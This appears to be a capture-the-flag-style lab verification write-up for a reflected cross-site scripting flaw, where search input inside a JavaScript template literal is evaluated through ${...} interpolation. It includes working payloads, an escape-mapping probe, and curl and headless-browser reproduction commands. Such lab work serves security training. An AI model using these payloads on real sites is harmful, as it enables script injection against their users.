# Verification — Template-literal interpolation breakout

## Methodology
1. Reflection sweep (curl): marker → echoes (HTML body + inline literal).
2. Escape map with the full set (`'"<>\` + backtick + `${}`) in ONE probe.
3. Interpolation proof headlessly (numeric title, quoteless).
4. Lab acceptance: real-browser `${alert(1)}`; banner polls.

## Evidence

### 1. Reflections (curl, `?search=reconprobe`)
```
(no <h1> echo on this build — only:)
var message = `0 search results for 'reconprobe'`;
(document.getElementById('searchMessage').innerText = message; follows — safe sink)
```
Single echo, backtick-wrapped. (The `innerText` assignment is defense-in-depth by
accident: even displaying the value can't re-trigger — execution happened earlier.)

### 2. Escape map (curl, `?search=ENC'"<>\`${}`)
```
var message = `0 search results for 'ENC\u0027\u0022\u003c\u003e\u005c\u0060${}'`;
```
Six classes neutralized (`\uXXXX`), `${}` verbatim — the complete and final map in
one request.

### 3. Execution proof (headless dump-dom)
```
?search=%24%7Bdocument.title%3D404002%7D
→ <title>404002</title>
→ rendered: var message = `0 search results for '${document.title=404002}'`;
```
Literal evaluation ran the expression during initial parse.

### 4. Lab acceptance
Real browser → `/?search=%24%7Balert(1)%7D` → `alert(1)` on parse → `is-solved`
(first poll).

### 5. Dead-end analysis
| Candidate | Verdict | Basis |
|---|---|---|
| Quote/backtick breakout | dead | `\u00XX` escapes (all six) |
| `</script>` closure | dead | `\u003c` (no literal `<` survives) |
| `\`-shift | dead | `\u005c` (no raw backslash) |
| inner quoted strings | would mangle (unneeded) | `\u0027` inside `${}` is a syntax error — quoteless payloads only (structural, from map) |
| `innerText` as second sink | inert by design | text assignment, never parses (defense-in-depth accident) |

## Reproducibility
```
BASE=…
curl -s "$BASE/?search=ENC%27%22%3C%3E%5C%60%24%7B%7D" | grep "var message"
chromium --headless --no-sandbox --dump-dom "$BASE/?search=%24%7Bdocument.title%3D404002%7D" | grep -o "<title>[^<]*</title>"
```

## Confirmation criteria
- CONFIRMED: single echo, six-class escape map, interpolation execution (title),
  real-browser acceptance.
- The map's completeness (terminators + closure + shift ALL dead) is what forces
  — and justifies — the interpolation shape.